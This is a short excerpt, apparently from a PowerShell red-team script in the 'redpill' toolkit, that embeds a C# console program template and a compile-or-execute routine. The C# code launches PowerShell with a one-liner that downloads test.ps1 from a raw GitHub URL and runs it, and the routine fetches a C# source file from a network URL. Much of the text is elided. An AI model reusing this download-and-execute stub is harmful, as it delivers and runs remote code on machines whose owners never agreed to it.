...
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           ...
           process.StartInfo.Arguments = `"iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/test.ps1 -OutFile test.ps1;powershell -File test.ps1`";
...
If($Action -ieq "Compile" -or $Action -ieq "Execute")
{
   ...
   {## Download script.CS from network URL sellected!
